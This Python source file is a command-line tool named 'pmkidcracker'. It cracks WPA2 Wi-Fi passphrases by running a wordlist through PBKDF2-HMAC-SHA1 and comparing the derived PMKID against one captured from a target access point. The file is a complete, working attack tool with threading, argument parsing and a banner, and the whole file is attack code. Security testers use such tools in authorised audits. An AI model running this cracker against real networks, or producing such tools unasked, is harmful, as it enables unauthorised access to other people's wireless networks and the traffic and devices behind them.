import hmac
from hashlib import pbkdf2_hmac, sha1
import argparse
import threading
import concurrent.futures
import time


def calculate_pmkid(pmk, ap_mac, sta_mac):
    """
    Calculates the PMKID with HMAC-SHA1[pmk + ("PMK Name" + bssid + clientmac)]
    128 bit PMKID will be matched with captured PMKID to check if passphrase is valid
    """
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid


def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event):
    """
    Finds the passphrase by computing pmk and passing into calculate_pmkid function.
    256 bit pmk calculation: passphrase + salt(ssid) => PBKDF2(HMAC-SHA1) of 4096 iterations
    """
    for pw in pw_list:
        if stop_event.is_set():
            break
        password = pw.strip()
        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        if pmkid == captured_pmkid:
            print(f"\n[+] CRACKED WPA2 KEY: {password}")
            stop_event.set()

class CustomFormatter(argparse.HelpFormatter):
    def format_help(self):
        help_str = super().format_help()
        art_str = r"""
        ___  __  __  _  __ ___  ___    ___                 _             
        | _ \|  \/  || |/ /|_ _||   \  / __| _ _  __ _  __ | |__ ___  _ _ 
        |  _/| |\/| || ' <  | | | |) || (__ | '_|/ _` |/ _|| / // -_)| '_|
        |_|  |_|  |_||_|\_\|___||___/  \___||_|  \__,_|\__||_\_\\___||_|                                                                
        """
        return art_str + "\n" + help_str

def main():
    parser = argparse.ArgumentParser(prog='pmkidcracker', 
                                    description='A multithreaded tool to crack WPA2 passphrase using obtained PMKID without clients or de-authentication.',
                                    usage='%(prog)s -s SSID -ap BSSID -c CLIENTMAC -p PMKID -w WORDLIST -t THREADS')

    parser = argparse.ArgumentParser(formatter_class=CustomFormatter)
    parser.add_argument("-s", "--ssid", help="SSID of Target AP", required=True)
    parser.add_argument("-ap", '--accesspoint', help="BSSID of AP (hex)", required=True)
    parser.add_argument("-c", "--clientmac", help="Client MAC Address, the initiator (hex)", required=True)
    parser.add_argument("-p", "--pmkid", help="EAPOL Message 1 PMKID (hex)", required=True)
    parser.add_argument("-w", "--wordlist", help="Dictionary wordlist to use", required=True)
    parser.add_argument("-t", "--threads", help="Number of threads (Default=10)", required=False)
    args = parser.parse_args()

    ssid = (args.ssid).encode()
    bssid = args.accesspoint
    client = args.clientmac
    pmkid = args.pmkid
    wordlist = args.wordlist

    workers = 10
    if args.threads is not None:
        workers = int(args.threads)

    print(f"[*] Initializing PMKID Cracker")
    print(f"[*] SSID: {args.ssid}")
    print(f"[*] BSSID: {args.accesspoint}")
    print(f"[*] Client Mac: {args.clientmac}")
    print(f"[*] PMKID: {args.pmkid}")
    print(f"[*] Using Wordlist: {args.wordlist}")
    print(f"[*] Using Threads: {workers}")
    
    bssid = bytes.fromhex(bssid.replace(":", ""))
    client = bytes.fromhex(client.replace(":", ""))
    pmkid = bytes.fromhex(pmkid)
    
    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor, open(wordlist, "r", encoding='ISO-8859-1') as file:
            start = time.perf_counter()
            chunk_size = 100000
            futures = []
            
            while True:
                pw_list = file.readlines(chunk_size)
                if not pw_list:
                    break
                
                if stop_event.is_set():
                    break

                future = executor.submit(find_pw_chunk, pw_list, ssid, bssid, client, pmkid, stop_event)
                futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                pass

    finish = time.perf_counter()
    print(f'[+] Finished in {round(finish-start, 2)} second(s)')


if __name__ == '__main__':
    main()